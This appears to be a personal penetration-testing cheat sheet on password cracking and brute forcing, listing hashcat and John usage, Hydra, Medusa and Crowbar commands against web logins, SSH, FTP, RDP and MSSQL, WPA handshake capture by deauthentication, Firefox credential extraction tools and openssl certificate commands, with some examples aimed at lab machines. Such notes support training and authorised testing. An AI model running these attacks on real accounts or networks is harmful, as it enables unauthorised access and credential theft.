- [Basics](#basics)
- [Hashcat](#hashcat)
  - [Wireles](#wireles)
- [John](#john)
- [Hydra](#hydra)
- [Medusa](#medusa)
- [Crowbar](#crowbar)
- [User enumeration](#user-enumeration)
- [Brutespray](#brutespray)
- [Creating Wordlists](#creating-wordlists)
- [Zip files](#zip-files)
- [Mozillas files](#mozillas-files)
- [SSL](#ssl)


## Basics
- cracking: from hash
- guessing: from dictionary (loud)
- dump = leaks of passwords/hash
- Combine
  - cat file1 file2 > file3
  - sort fil3 | uniq u > cleaned
- [CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- Storage
  - ~/.local/share/hashcat/hashcat.potfile
  - --potfile-path: write own potfile

```
# Alias
hashcat --potfile-path $(basename "$PWD").potfile
```
  
## Hashcat
- Identify hash
  - hashid -m HASH
    - -j JOHN format
    - -m HASHCAT mode
  - hash-identifier: hash
  - [Examples hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-  --username: ignore usernames in the file
- [Crackstation](https://crackstation.net/)

- **ntdsautid**
- **dpat** - [Domain Password Audit Tool (DPAT)](https://github.com/clr2of8/DPAT)
  - dtap.py -c CRACKED -o ORIGIN

- wordlist
  - hashcat target /path/to/word/list
  - hashcat --example-hash

- hashcat -a MODE -b TYPE hash_file
  - w INTENSITY

- Options
  - -O optimize kernels
  - -w specific worload profile
    - 1,2,3 (intensive)
  - --stdout = display
  - --outfile="filename.txt"
  - --force = ignore wartning
  - TOTAL_CHARACTERS = generate list
  
- **Modes**
  - -a 0: dictionary: fast
  - -a 3: brute force method
  - -a 1: combination: two wordlists 
    - -a 1 --stdout file1 file2
  - -a 6 '?d?s': wordlist+mask
  - -a 7 prepend: mask+wordlist
  
  - Mask: [generate words matching pattern](https://hashcat.net/wiki/doku.php?id=mask_attack)
    - -1 AB Placeholder AB

| Placeholder | Meaning  |
| :---------: | :------: |
|     ?l      |   a-z    |
|     ?u      |   A-Z    |
|     ?d      |   0-9    |
|     ?h      |  0...f   |
|     ?H      |  0...F   |
|     ?s      |    @!    |
|     ?a      | ?l?u?d?s |
|     ?b      |   0x00   |

```
# Example
Password<userid><year>
<userid> = 5 digits = ?l?l?l?l?l
<year>   = 4 digits = 20?1?d

hashcat -m MODE -a TYPE hash_file -1 01 'Password?l?l?l?l?l20?1?d'
Password   = 
?l?l?l?l?l = <userid>  = a-z 
20 
?1    = 0|1
?d    = 0-9 
```

- Utils
  - [maskprocessor](https://github.com/hashcat/maskprocessor)

- **Rules**
  - -r rule_file
    - /usr/share/hashcat/rules/*
  - -g NUMBER = create random rules
  - [Rules](https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions)
  - [nsa-rules](https://github.com/NSAKEY/nsa-rules)
  - [Hob0Rules](https://github.com/praetorian-inc/Hob0Rules)
  - [corporate.rule](https://github.com/sparcflow/HackLikeALegend/blob/master/old/chap3/corporate.rule)

```
l	Convert all letters to lowercase
u	Convert all letters to uppercase
c / C	capitalize / lowercase first letter and invert the rest
t / TN	Toggle case : whole word / at position N
...

c so0 si1 se3 ss5 sa@ $2 $0 $1 $9
so0 = replace o to 0
$2 $0 $1 $9 = append to the end

hashcat -r rule.txt combmd5 --stdout
P@55w0rd_1lfr31ght2019
```

- Extract hashes from files
```
9400 MS Office 2007
9500 MS Office 2010
9600 MS Office 2013
11600 7-zip ...
13400 KeePass ...
10400 PDF
```

### Wireles
- get cap/pcap file + extract hash with tool/online, crack hash

- **MIC**: Message Integrity Check
  - Capture 4-way handshake
    - send de-authentication frames ==> reauthenticate: airodump.ng
    - hashcat format hccapx
    - [cap2hashcat online converter](https://hashcat.net/cap2hashcat/)
    - [hashcat-utils](https://github.com/hashcat/hashcat-utils.git)
      - /cap2hccapx.bin 
    - -m 22000
- **PMKID**: Pairwise Master Key Identifier
  - For WPA/WPA2-PSK
  - PKMID = PMK Name + MAC AP + MAC Station
  - Extract hash from. cap
    - [hcxtools](https://github.com/ZerBea/hcxtools):
      - ./hcxpcapngtool 
  - -m 22000

  
## John
- [john](https://github.com/openwall/john/tree/bleeding-jumbo)
- Using rules
  - john --wordlist=existing_list --rules=pick_one --stdout
  - --format=ENCRYPTION
  - adding rule
    - conf file: [rule_name] Az"[0-9]" ^[!@#$]

- zip2john file.zip > zip.hasj
- ssh2john key > key.hash
- office2john
- keepass2john
- pdf2john

## Hydra
- hydra -l username -P wordlist.txt server service
- hydra -l username -P wordlist.txt service://server (hydra -l -u $target smb -V -f)
- -d = debug
- -v = verbose
- -V = show attempts
  - vV = more info
- -f = terminate if found
- -s = port to connect
- -t = number threadlos
- hydra MODULE -U

- web
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[PATH_TO_LOGIN]:[body_request]:[F|S]=[ERROR_MESSAGE]"** -vV -f
    - F:failing strings
    - S:sucessfull strings
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[request]:username=^USER^&password=^PASS^:F=incorrect"** -v
  
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* '/login.aspx:BODY_PARAMETER_WITH_PASSWORD:S=logout.php' -f
  
    - Request: *HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy*
    - IP/URL http-get-form | http-post-form "/login-get/index.php:[BODY_CONTENT]&username=^USER^&PASSWORD=^PASS:S=logout.php" -f
    - for post: whole POST BODY
      - S= [message_for_success]
      - F= [message_for_failed]
      - -V Verbose
      - -f = stop attack after finding
      - -L = List of usernames
      - -s=302 ==> sucessfull redirect

```
hydra -l Elliot -P /usr/share/wordlists/rockyou.txt.gz $target http-post-form\n'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.131%2Fwp-admin%2F&testcookie=1:ERROR: The password you entered for the username elliot is incorrect. Lost your password?'  -f

hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'\n
```

- FTP
  - hydra -l [USERNAME] -P password.lst ftp://IP:PORT

- SMPT
  - hydra -l email@address.com -P [Password_List] smtp://IP -v
  - hydra -L users.txt -p 'PASS' -f $TARGET pop3/smtp/imap4

- SSH
  - hydra -L [USER_LIST] -P [PASS_LIST] ssh://IP -v

- MSSQL
  - hydra -L user.txt –P pass.txt $TARGET mssql
  
- rdp
  - hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

- Default Usernames:
```
root
admin
```

## Medusa
- medusa -U user -P pass -h $TARGET -M ftp

## Crowbar
- crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

## User enumeration
-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
   -  the *FUZZ* will be replaced by the items in the wordlist

- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
- https://tryhackme.com/room/authenticationbypass

## Brutespray
- Toll that uses result from nmap scan .xml
- [Information here](https://github.com/x90skysn3k/brutespray)

## Creating Wordlists
- [cewl](https://github.com/digininja/CeWL) 
  - cewl URL
  - -w = output
  - -d 5 = depth
  - -m 5 = minimum
  - -e extract emails
  
- username_gennerator.py

- crunch
  - combination of characters
  - crunch 2 2 123456abcd -o output
  - -t Password[pattern][pattern]
    - @ lower case
    - , upercase
    - % numeric
    - ^ special
  - -d repetitions

- cupp: Common User Password Profiler
  - based on information of the target, birthdate, pet, etc
  - https://github.com/Mebus/cupp

- [KWPROCESSOR](https://github.com/hashcat/kwprocessor)
  - wordlist with keyboard walks
  - --keywalk-west

- [Princeprocessor](https://github.com/hashcat/princeprocessor)
  - PRobability INfinite Chained Elements
  - Create chains of words from the list
  - --keyspace < words = number of combinations
  - -o wordlist.txt < words = write output
  - --pw-min | --pw-max
  - --elem-cnt-min | --elem-cnt-max

## Zip files
- fcrackzip
  - -D = dictionary
  - -u = only correct password

## Mozillas files
- Files
  - .db
  - logins.json
  - cookies.sqlite
- https://github.com/lclevy/firepwd.git
- https://github.com/unode/firefox_decrypt.git
- msfconsole:
  -  use post/multi/gather/firefox_creds = extract files

## SSL
- Create certificates, pub.keys, priv.keys
- Verify priv.key to certificate
  - openssl pkey -in INPUT.key -pubout

- Verify pub.key from certificate
  - openssl x509 -in ca.crt -pubkey -noout
  
  - Compare
    - openssl x509 -in ca.crt -pubkey -noout | md5sum; \
openssl pkey -in ca.key -pubout | md5sum

- Generate certificate
  - openssl genrsa -out client.key 4096
  - openssl req -new -key client.key -out client.src
  
- Sign certificate with key
    - openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out my.pem
    - openssl req -x509 -new -nodes -key KEY.key -sha256 -days 1024 -out MyCert.pem
  - pkcs12 = combination(.key,.cer)
    - openssl pkcs12 -export -inkey client.key -in client.cert -out client.p12
    - openssl pkcs12 -export -in 0xdf.pem -inkey ca.key -out client.p12
  - check pkcs12
    - openssl pkcs12 -info -in client.p12

- Verify certificates
  - openssl verify -verbose -CAfile ca.crt client.cer
  
- pfx file: Personal Information Exchange = store/transport senstive information 
- Extract key
  - openssl pkcs12 -in originalfile.pfx -nocerts -out key.pem -nodes
- Extrackt certificate
  - openssl pkcs12 -in originalfile.pfx -nokeys -out cert.pem